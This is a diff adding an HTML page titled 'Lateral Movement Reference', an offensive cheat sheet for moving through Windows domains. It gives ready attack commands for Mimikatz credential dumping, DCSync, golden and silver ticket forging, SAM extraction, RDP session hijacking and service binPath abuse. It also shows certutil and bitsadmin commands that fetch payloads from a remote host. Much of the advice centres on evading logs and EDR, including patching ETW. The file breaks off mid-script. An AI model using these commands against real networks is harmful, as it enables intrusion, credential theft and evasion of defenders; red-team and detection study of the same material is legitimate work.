@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lateral Movement Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#fbbf24,#f59e0b,#ef4444);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb.on{background:#111318}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+var SE=[
+{id:"rex",l:"A. Remote Exec",i:"\u{1F4BB}",c:"#f87171"},
+{id:"rdp",l:"B. RDP/GUI",i:"\u{1F5A5}\uFE0F",c:"#60a5fa"},
+{id:"pth",l:"C. Pass-the-Hash",i:"\u{1F511}",c:"#a78bfa"},
+{id:"krb",l:"D. Kerberos",i:"\u{1F3AB}",c:"#fbbf24"},
+{id:"xfr",l:"E. File Transfer",i:"\u{1F4E4}",c:"#34d399"},
+{id:"wmi",l:"F. WMI/CIM",i:"\u{1F50C}",c:"#f59e0b"},
+{id:"adv",l:"G. Advanced",i:"\u{1F9E0}",c:"#e879f9"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
+];
+var S={s:'rex',t:'flow'};
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+function fREX(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">REMOTE EXECUTION METHODS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4BB}","PsExec / SMB + SCM","#f87171",
+'<div style="margin-bottom:4px">Upload binary via SMB \u2192 create service \u2192 start \u2192 delete. Classic.</div>'+
+F("445","SMB for file copy","TCP")+F("135","SCM for service creation","TCP")+F("","Runs as SYSTEM","")+F("","Leaves Event 7045 (service install)","")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 Extremely well-detected. Named pipe artifact.</div>');
+h+=CRD("\u{1F50C}","WMI Process Create","#f87171",
+'<div style="margin-bottom:4px">Win32_Process.Create() on remote host. No file copy needed if payload exists.</div>'+
+F("135","DCOM/WMI","TCP")+F("","Runs as calling user","")+F("","No service creation event","")+F("","No output returned (blind execution)","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Less artifacts than PsExec. Blind though.</div>');
+h+=CRD("\u{1F310}","WinRM / PowerShell Remoting","#f87171",
+'<div style="margin-bottom:4px">Invoke-Command or Enter-PSSession over HTTP/HTTPS.</div>'+
+F("5985","HTTP","TCP")+F("5986","HTTPS","TCP")+F("","Full PowerShell session","")+F("","Output returned to caller","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Encrypted. Built-in. Interactive or fire-and-forget.</div>');
+h+=CRD("\u{1F3AD}","DCOM Objects","#f87171",
+'<div style="margin-bottom:4px">Instantiate COM objects on remote host. Multiple execution primitives.</div>'+
+F("135","DCOM","TCP")+F("","MMC20.Application.ExecuteShellCommand","")+F("","ShellWindows.Item().Document.Application.ShellExecute","")+F("","ShellBrowserWindow","Outlook.Application")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No service, no WMI. Less monitored. Many object choices.</div>');
+h+=CRD("\u{1F552}","Remote Scheduled Task","#f87171",
+'<div style="margin-bottom:4px">Create task on remote host via ITaskService or schtasks /s.</div>'+
+F("135","RPC/Task Scheduler","TCP")+F("","schtasks /create /s TARGET /tn X /tr cmd","")+F("","COM: ITaskService->Connect(target)","")+
+'<div style="font-size:.88em;color:#60a5fa;margin-top:4px">Event 4698 logged. Task visible in Task Scheduler.</div>');
+h+=CRD("\u2699\uFE0F","Remote Service Control","#f87171",
+'<div style="margin-bottom:4px">Modify existing remote service binPath, start, then restore.</div>'+
+F("445","SMB/SCM","TCP")+F("","sc \\\\\\\\TARGET config SvcName binPath= payload.exe","")+F("","sc \\\\\\\\TARGET start SvcName","")+F("","Restore original binPath after","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No service creation. Modifies existing. Less logging.</div>');
+h+='</div>';return h;
+}
+
+function fRDP(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">RDP / GUI-BASED LATERAL MOVEMENT</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F5A5}\uFE0F","Standard RDP","#60a5fa",
+'<div style="margin-bottom:4px">Full graphical session. Most common lateral movement for interactive ops.</div>'+
+F("3389","RDP","TCP")+F("","mstsc.exe /v:TARGET","")+F("","NLA authentication by default","")+F("","Event 4624 Type 10 logged","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Very visible. Session visible on host. Event logs abundant.</div>');
+h+=CRD("\u{1F47B}","RDP Session Hijacking","#60a5fa",
+'<div style="margin-bottom:4px">Take over disconnected session without credentials. Requires SYSTEM.</div>'+
+F("","tscon SESSION_ID /dest:console","")+F("","Or: tscon via service running as SYSTEM","")+F("","No password needed for disconnected sessions","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No authentication event. Reuse existing session.</div>');
+h+=CRD("\u{1F510}","SharpRDP","#60a5fa",
+'<div style="margin-bottom:4px">Programmatic RDP using MSTSCAX COM. Keystrokes sent without GUI.</div>'+
+F("3389","RDP","TCP")+F("","Authenticate + send keystrokes programmatically","")+F("","No visible window on attacker machine","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Scriptable RDP without mstsc.exe process.</div>');
+h+=CRD("\u{1F500}","RDP Tunneling","#60a5fa",
+'<div style="margin-bottom:4px">Tunnel RDP through SSH, netsh, or custom proxy to bypass firewall rules.</div>'+
+F("","SSH: ssh -L 3389:TARGET:3389 jumphost","")+F("","netsh portproxy: local port forward","")+F("","Chisel/ligolo for complex tunnels","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Bypasses network segmentation. RDP over allowed ports.</div>');
+h+='</div>';return h;
+}
+
+function fPTH(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">PASS-THE-HASH / TOKEN TECHNIQUES</div>';
+h+='<div class="fr">';
+h+=B("Credential Source","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","LSASS memory dump (Mimikatz)")+F("","SAM database (reg save)")+F("","NTDS.dit (domain controller)")+F("","Cached credentials (MSCASH)")+F("","Kerberos tickets (kirbi/ccache)")+'</div>',220);
+h+=A("NTLM hash");
+h+=B("Pass-the-Hash","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","NTLM auth uses hash directly")+F("","No plaintext password needed")+F("","sekurlsa::pth in Mimikatz")+F("","Impacket: -hashes LM:NT")+F("","Works for: SMB, WMI, WinRM, RDP (restricted)")+'</div>',240);
+h+=A("session");
+h+=B("Overpass-the-Hash","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","NTLM hash \u2192 request Kerberos TGT")+F("","Converts hash to Kerberos ticket")+F("","sekurlsa::pth /run:cmd (gets TGT)")+F("","Then use Kerberos for lateral movement")+F("","Avoids NTLM-specific detections")+'</div>',240,"PTH \u2192 Kerberos");
+h+='</div>';
+h+=N("KEY DIFFERENCE","#a78bfa","<b>PTH</b> uses NTLM hash directly for NTLM auth. <b>Overpass-the-Hash</b> converts the hash into a Kerberos TGT, then uses Kerberos auth. Overpass avoids NTLM logging and works with Kerberos-only environments.");
+return h;
+}
+
+function fKRB(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">KERBEROS-BASED LATERAL MOVEMENT</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3AB}","Pass-the-Ticket","#fbbf24",
+'<div style="margin-bottom:4px">Export Kerberos ticket from one machine, import on another. Use for any service.</div>'+
+F("","sekurlsa::tickets /export","")+F("","kerberos::ptt ticket.kirbi","")+F("","Or: Rubeus.exe ptt /ticket:base64","")+F("","Works with TGT (any service) or TGS (specific service)","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No hash needed. Reuse existing auth. Evades NTLM monitoring.</div>');
+h+=CRD("\u{1F451}","Golden Ticket","#fbbf24",
+'<div style="margin-bottom:4px">Forge TGT using krbtgt hash. Unlimited access to entire domain.</div>'+
+F("","Requires: krbtgt NTLM hash","")+F("","kerberos::golden /domain:X /sid:X /krbtgt:HASH","")+F("","Valid for 10 years by default","")+F("","Any user, any group, any SID","")+
+'<div style="font-size:.88em;color:#e879f9;margin-top:4px">\u2713 God-mode. Survives password changes (until krbtgt rotated 2x).</div>');
+h+=CRD("\u{1FA99}","Silver Ticket","#fbbf24",
+'<div style="margin-bottom:4px">Forge TGS using service account hash. Access specific service only.</div>'+
+F("","Requires: service account NTLM hash","")+F("","kerberos::golden /service:cifs/target /rc4:HASH","")+F("","Never touches DC (no TGT request)","")+F("","Works for: CIFS, HTTP, MSSQL, HOST, LDAP","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No DC communication = no DC logs. Stealthy.</div>');
+h+=CRD("\u{1F504}","Delegation Abuse","#fbbf24",
+'<div style="margin-bottom:4px">Abuse unconstrained/constrained/RBCD delegation for privilege escalation.</div>'+
+F("","Unconstrained: any TGT forwarded to host","")+F("","Constrained: S4U2Proxy to impersonate","")+F("","RBCD: modify msDS-AllowedToActOnBehalfOfOtherIdentity","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 RBCD: no DA needed to configure. Write access to computer object sufficient.</div>');
+h+='</div>';return h;
+}
+
+function fXFR(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">FILE TRANSFER / STAGING</div>';
+h+='<div class="grd">';
+var methods=[
+{n:"SMB (C$/ADMIN$)",p:"445",d:"copy payload.exe \\\\\\\\TARGET\\\\C$\\\\Windows\\\\Temp\\\\",c:"#34d399",r:"Admin share"},
+{n:"SMB (Custom Share)",p:"445",d:"net use \\\\\\\\TARGET\\\\share /user:DOMAIN\\\\user pass",c:"#34d399",r:"Writable share"},
+{n:"WinRM Copy",p:"5985",d:"Copy-Item -ToSession $s -Path local -Dest remote",c:"#60a5fa",r:"PS Remoting"},
+{n:"BITS Transfer",p:"80/443",d:"bitsadmin /transfer job http://src dest. Background, resumable.",c:"#a78bfa",r:"Background DL"},
+{n:"certutil",p:"80/443",d:"certutil -urlcache -split -f http://src dest. LOLBin.",c:"#f59e0b",r:"LOLBin"},
+{n:"PowerShell Download",p:"80/443",d:"IWR/Invoke-WebRequest, Net.WebClient, Start-BitsTransfer",c:"#f59e0b",r:"In-memory option"},
+{n:"WebDAV",p:"80/443",d:"Map WebDAV as drive. UNC path \\\\\\\\attacker@80\\\\share\\\\.",c:"#e879f9",r:"Firewall bypass"},
+{n:"RDP Drive Mount",p:"3389",d:"mstsc /drives. Local drives accessible as \\\\tsclient\\\\C.",c:"#60a5fa",r:"RDP session"},
+{n:"PsExec -c",p:"445",d:"PsExec copies binary automatically before execution.",c:"#f87171",r:"Integrated"},
+{n:"Impacket smbclient",p:"445",d:"smbclient.py -hashes :HASH user@TARGET. Interactive SMB.",c:"#34d399",r:"Linux tool"}
+];
+methods.forEach(function(m){
+h+='<div style="border-radius:6px;border:1px solid '+m.c+'20;background:'+m.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+m.c+';font-size:.76em">'+m.n+'</span><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+m.r+'</span></div><div style="font-size:.66em;color:#9ca3af;margin-top:1px;display:flex;gap:8px"><span>Port: '+m.p+'</span><span>'+m.d+'</span></div></div>';
+});
+h+='</div>';return h;
+}
+function fWMI(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">WMI / CIM LATERAL MOVEMENT</div>';
+h+='<div class="fr">';
+h+=B("Connect","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("135","DCOM initial","TCP")+F("","IWbemLocator::ConnectServer","")+F("","Namespace: root\\\\cimv2","")+F("","Creds: current or explicit user/pass")+'</div>',200);
+h+=A("session");
+h+=B("Execute","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Win32_Process.Create(cmd)","")+F("","Win32_ScheduledJob (deprecated)","")+F("","Win32_Service.Create","")+F("","StdRegProv for registry edits","")+F("","CIM_DataFile for file ops","")+'</div>',220);
+h+=A("result");
+h+=B("Output Retrieval","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Process.Create = blind (no output)","")+F("","Redirect: cmd /c command > \\\\\\\\share\\\\out","")+F("","WMI property store (write to WMI class)","")+F("","Registry read-back (StdRegProv)","")+F("","SMB file read after execution","")+'</div>',240);
+h+='</div>';
+h+=N("CIM vs WMI","#f59e0b","CIM (New-CimSession) uses WSMan (5985/5986) by default. WMI uses DCOM (135 + dynamic). CIM over WSMan is often allowed through firewalls when DCOM is blocked.");
+return h;
+}
+
+function fADV(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">ADVANCED LATERAL MOVEMENT</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3AD}","DCOM Lateral Movement Objects","#e879f9",
+'<div style="margin-bottom:4px">COM objects that allow remote code execution when instantiated remotely.</div>'+
+F("","MMC20.Application","ExecuteShellCommand")+F("","ShellWindows","Document.Application.ShellExecute")+F("","ShellBrowserWindow","Same as ShellWindows")+F("","Outlook.Application","CreateObject for script exec")+F("","Excel.Application","DDEInitiate or RegisterXLL")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No service creation. Various execution primitives.</div>');
+h+=CRD("\u{1F500}","WinRM Proxy / Double Hop","#e879f9",
+'<div style="margin-bottom:4px">Use WinRM to pivot through intermediate hosts. CredSSP or delegation for cred forwarding.</div>'+
+F("","Invoke-Command -Session $hop1 { Invoke-Command -ComputerName hop2 ... }","")+
+F("","CredSSP enables double-hop","")+F("","Or: export/import Kerberos tickets","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 CredSSP exposes plaintext creds. Prefer ticket forwarding.</div>');
+h+=CRD("\u{1F510}","SSH (OpenSSH on Windows)","#e879f9",
+'<div style="margin-bottom:4px">Windows 10+ includes OpenSSH server. SSH for lateral movement.</div>'+
+F("22","SSH","TCP")+F("","ssh user@TARGET","")+F("","Key-based auth (no password)","")+F("","SCP for file transfer","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Encrypted. Less monitored than WinRM in many environments.</div>');
+h+=CRD("\u{1F4E1}","Named Pipe Pivoting","#e879f9",
+'<div style="margin-bottom:4px">Create named pipe on remote host. C2 communicates through SMB named pipe.</div>'+
+F("445","SMB named pipes","TCP")+F("","Beacon SMB: pipe-based C2 channel","")+F("","No direct internet from target needed","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Internal traffic only. C2 over SMB blends with file sharing.</div>');
+h+=CRD("\u{1F578}\uFE0F","SOCKS Proxy / Tunnel","#e879f9",
+'<div style="margin-bottom:4px">Establish SOCKS proxy on compromised host. Route tools through it.</div>'+
+F("","Chisel: chisel server --socks5","")+F("","Ligolo-ng: TUN-based, fast","")+F("","SSH -D: dynamic SOCKS forward","")+F("","Proxychains for tool routing","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Route any tool through internal network. Versatile.</div>');
+h+=CRD("\u{1F4CA}","MSSQL Lateral Movement","#e879f9",
+'<div style="margin-bottom:4px">xp_cmdshell, linked servers, CLR assemblies for SQL-based pivoting.</div>'+
+F("1433","MSSQL","TCP")+F("","EXEC xp_cmdshell \'whoami\'","")+F("","EXEC AT [LinkedServer] xp_cmdshell ...","")+F("","CLR assembly for .NET code execution","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 SQL Server often has access to internal segments.</div>');
+h+='</div>';return h;
+}
+
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">CREDENTIAL ACCESS METHODS</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var creds=[
+{n:"LSASS Dump (Mimikatz)",d:"sekurlsa::logonpasswords. NTLM hashes, Kerberos tickets, plaintext if WDigest enabled.",c:"#f87171",r:"Classic"},
+{n:"SAM Database",d:"reg save HKLM\\\\SAM sam.bak + reg save HKLM\\\\SYSTEM sys.bak. Offline extraction.",c:"#f87171",r:"Local hashes"},
+{n:"NTDS.dit (DC)",d:"ntdsutil, VSS shadow copy, or DCSync. All domain hashes.",c:"#e879f9",r:"Domain dump"},
+{n:"DCSync",d:"Mimikatz lsadump::dcsync /user:krbtgt. Replicates hashes via DRSUAPI. No DC access needed.",c:"#e879f9",r:"Remote"},
+{n:"Kerberoasting",d:"Request TGS for SPN accounts. Crack offline. No special privs needed.",c:"#fbbf24",r:"Offline crack"},
+{n:"AS-REP Roasting",d:"Request AS-REP for accounts without preauth. Crack offline.",c:"#fbbf24",r:"No preauth"},
+{n:"DPAPI Secrets",d:"Decrypt saved creds, browser passwords, Wi-Fi keys via DPAPI master key.",c:"#a78bfa",r:"User secrets"},
+{n:"LSASS Minidump",d:"comsvcs.dll MiniDump, ProcDump, or direct NtReadVirtualMemory. Offline parse.",c:"#f87171",r:"EDR evasion"}
+];
+creds.forEach(function(x){
+h+='<div style="border-radius:6px;border:1px solid '+x.c+'20;background:'+x.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+x.c+';font-size:.76em">'+x.n+'</span><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+x.r+'</span></div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+x.d+'</div></div>';
+});
+h+='</div>';
+h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">NETWORK RECONNAISSANCE</div>';
+h+='<div class="fr">';
+h+=B("Discovery","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","net view /domain","")+F("","nltest /dclist:domain","")+F("","nslookup -type=SRV _ldap._tcp.domain","")+F("","PowerView: Get-DomainComputer","")+F("","ADSearch / LDAP queries","")+'</div>',220);
+h+=A("targets");
+h+=B("Port Scan","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Test-NetConnection -Port 445","")+F("","445 = SMB, 135 = RPC/WMI","")+F("","5985 = WinRM, 3389 = RDP","")+F("","22 = SSH, 1433 = MSSQL","")+F("","Portscan.ps1 or Invoke-Portscan","")+'</div>',220);
+h+=A("reachable");
+h+=B("Access Check","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","dir \\\\\\\\TARGET\\\\C$ (admin share test)","")+F("","Invoke-Command -ComputerName T { whoami }","")+F("","Get-WmiObject -Computer T Win32_OS","")+F("","Test current creds on each target","")+'</div>',220);
+h+='</div>';return h;
+}
+
+function fBYP(){
+var h='<div class="grd">';
+h+=CRD("\u{1F525}","Firewall / Segmentation Bypass","#fb923c",
+'<div style="margin-bottom:4px">Common ports blocked between segments. Use allowed services as pivots.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">Port reuse</b><span style="color:#6b7280">Bind payload to already-open port (80, 443)</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">SOCKS tunnel</b><span style="color:#6b7280">Chisel/ligolo through allowed ports</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">DNS tunnel</b><span style="color:#6b7280">DNS almost always allowed. dnscat2, iodine.</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#a78bfa;min-width:130px">WebDAV</b><span style="color:#6b7280">HTTP-based file access through web proxies</span></div>');
+h+=CRD("\u{1F4CA}","Event Log Evasion","#fb923c",
+'<div style="margin-bottom:4px">Lateral movement generates logs on both source and target.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">4624 Type 3</b><span style="color:#6b7280">Network logon. WMI/SMB/PsExec.</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">4624 Type 10</b><span style="color:#6b7280">RemoteInteractive (RDP)</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Kerberos > NTLM</b><span style="color:#6b7280">Kerberos has fewer anomaly detections</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#a78bfa;min-width:130px">Silver tickets</b><span style="color:#6b7280">No DC log at all (direct TGS forge)</span></div>');
+h+=CRD("\u{1F6E1}\uFE0F","EDR / AV Evasion on Target","#fb923c",
+'<div style="margin-bottom:4px">Remote execution often triggers EDR on target host.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">Fileless</b><span style="color:#6b7280">WMI/WinRM execute in-memory</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">LOLBins</b><span style="color:#6b7280">Use legitimate binaries (msbuild, rundll32)</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Service DLL</b><span style="color:#6b7280">Load DLL via service, not drop EXE</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#a78bfa;min-width:130px">ETW blind</b><span style="color:#6b7280">Patch ETW on target before payload</span></div>');
+h+=CRD("\u{1F50D}","Credential Guard Bypass","#fb923c",
+'<div style="margin-bottom:4px">Credential Guard isolates LSASS secrets in VBS. No direct hash extraction.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">DCSync still works</b><span style="color:#6b7280">Replication doesn\'t need local secrets</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">Kerberos tickets</b><span style="color:#6b7280">Still extractable from memory</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">DPAPI keys</b><span style="color:#6b7280">User DPAPI still accessible</span></div>');
+h+=CRD("\u{1F512}","NTLM Relay","#fb923c",
+'<div style="margin-bottom:4px">Relay NTLM auth to another service. No cracking needed.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">ntlmrelayx</b><span style="color:#6b7280">Impacket: relay to SMB, LDAP, HTTP</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">Coerce + relay</b><span style="color:#6b7280">PetitPotam/PrinterBug forces auth to you</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">RBCD write</b><span style="color:#6b7280">Relay to LDAP, set RBCD, get tickets</span></div>');
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.rex=[
